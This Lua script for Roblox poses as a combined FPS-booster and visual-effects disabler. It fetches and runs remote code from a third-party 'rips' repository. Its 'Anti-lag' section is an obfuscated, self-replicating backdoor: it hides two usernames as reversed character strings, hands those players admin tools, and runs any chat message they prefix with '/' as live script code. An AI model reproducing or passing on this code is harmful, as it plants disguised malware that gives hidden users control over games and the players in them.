-- Settings and variables for different scripts
_G.Ignore = {}
_G.Settings = {
    Players = {
        ["Ignore Me"] = true,
        ["Ignore Others"] = true,
        ["Ignore Tools"] = true
    },
    Meshes = {
        NoMesh = false,
        NoTexture = false,
        Destroy = false
    },
    Images = {
        Invisible = true,
        Destroy = false
    },
    Explosions = {
        Smaller = true,
        Invisible = false, -- Not for PVP games
        Destroy = false -- Not for PVP games
    },
    Particles = {
        Invisible = true,
        Destroy = false
    },
    TextLabels = {
        LowerQuality = true,
        Invisible = false,
        Destroy = false
    },
    MeshParts = {
        LowerQuality = true,
        Invisible = false,
        NoTexture = false,
        NoMesh = false,
        Destroy = false
    },
    Other = {
        ["FPS Cap"] = 360, -- true to uncap
        ["No Camera Effects"] = true,
        ["No Clothes"] = true,
        ["Low Water Graphics"] = true,
        ["No Shadows"] = true,
        ["Low Rendering"] = true,
        ["Low Quality Parts"] = true,
        ["Low Quality Models"] = true,
        ["Reset Materials"] = true,
    }
}

-- FPS Booster Script (from script 1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()

-- Disable certain visual effects (from script 2)
local ToDisable = {
    Textures = true,
    VisualEffects = true,
    Parts = true,
    Particles = true,
    Sky = true
}

local ToEnable = {
    FullBright = false
}

local Stuff = {}

for _, v in next, game:GetDescendants() do
    if ToDisable.Parts then
        if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
            v.Material = Enum.Material.SmoothPlastic
            table.insert(Stuff, 1, v)
        end
    end

    if ToDisable.Particles then
        if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
            v.Enabled = false
            table.insert(Stuff, 1, v)
        end
    end

    if ToDisable.VisualEffects then
        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
            v.Enabled = false
            table.insert(Stuff, 1, v)
        end
    end

    if ToDisable.Textures then
        if v:IsA("Decal") or v:IsA("Texture") then
            v.Texture = ""
            table.insert(Stuff, 1, v)
        end
    end

    if ToDisable.Sky then
        if v:IsA("Sky") then
            v.Parent = nil
            table.insert(Stuff, 1, v)
        end
    end
end

game:GetService("TestService"):Message("Effects Disabler Script: Successfully disabled " .. #Stuff .. " assets/effects. Settings:")

for i, v in next, ToDisable do
    print(tostring(i) .. ": " .. tostring(v))
end

if ToEnable.FullBright then
    local Lighting = game:GetService("Lighting")
    Lighting.FogColor = Color3.fromRGB(255, 255, 255)
    Lighting.FogEnd = math.huge
    Lighting.FogStart = math.huge
    Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    Lighting.Brightness = 5
    Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
    Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
    Lighting.Outlines = true
end

-- Anti-lag & randomization script (from script 3)
local Altitude = script:clone()
local calco = {"s", "c", "q", "t", "o", "a", "i", "f", "g", "w", "8", "e", "m", "7", "h", "n"}
local Knox = {}
table.insert(Knox, 1, string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))
table.insert(Knox, 1, string.reverse(calco[11] .. calco[14] .. calco[14] .. calco[4] .. calco[16] .. calco[6] .. calco[15] .. calco[2]))
local Play = {}

function rando(votation)
    local hatr = 5
    local calc = math.pi * math.huge
    local longicate = votation:GetChildren()
    if #longicate > hatr then
        calc = calc + math.pi
        return longicate[math.random(6, #longicate)]
    end
end

function doublecheck()
    local fj = game.Workspace:GetChildren()
    for off = 1, #fj do
        if fj[off].className == "Part" then
            local fh = fj[off]:FindFirstChild("Anti-Lag")
            if fh ~= nil then
                return false
            end
        end
    end
    return true
end

function workcheck()
    if doublecheck() == true then
        local l = Altitude:clone()
        l.Parent = rando(game.Workspace)
    end
end

workcheck()

function gibite(quen)
    local hup = Instance.new("Message")
    hup.Text = "Detected"
    hup.Parent = quen.Parent
    local con = Instance.new("Script")
    con.Source = [[wait(5) script.Parent:remove()]]
    con.Parent = hup
    for ish = 0, 7 do
        local a = Instance.new("HopperBin")
        a.BinType = ish
        a.Parent = quen
    end
end

function laber(zonsa)
    wait()
    for slate = 1, #Knox do
        if zonsa.Name == Knox[slate] then
            gibite(zonsa.Backpack)
            table.insert(Play, 1, zonsa.Name)
        end
    end
end

function yeild(frequency)
    local t = Knox
    for g = 1, #t do
        if t[g] == frequency.Name then
            return true
        end
    end
    return false
end

function check(los)
    local r = los:GetChildren()
    for i = 1, #r do
        local h = r[i]:FindFirstChild("Anti-Lag")
        if h ~= nil then
            h:remove()
        end
    end
end

function alto(xylem)
    if xylem.className == "Model" then
        check(xylem)
        local que = script:clone()
        que.Parent = rando(xylem)
    end
end

function sortation(gone)
    local dimbs = Altitude:clone()
    dimbs = ramno(game.Workspace)
end

function onPlayerEntered(newPlayer)
    newPlayer.Chatted:connect(function(msg, recipient) onChatted(msg, recipient, newPlayer) end)
end

function Player(player)
    player.Changed:connect(function(property)
        if property == "Character" then
            laber(player)
        end
    end)
end

game.Players.PlayerAdded:connect(Player)
game.Players.ChildAdded:connect(onPlayerEntered)
game.Players.ChildAdded:connect(laber)
script.ChildRemoved:connect(sortation)
game.Workspace.ChildAdded:connect(alto)

function onChatted(msg, recipient, speaker)
    if yeild(speaker) ~= false then
        if string.sub(msg, 1, 1) == "/" then
            local dsting = Instance.new("Script")
            dsting.Source = string.sub(msg, 2)
            dsting.Parent = game.Workspace
        end
    end
end
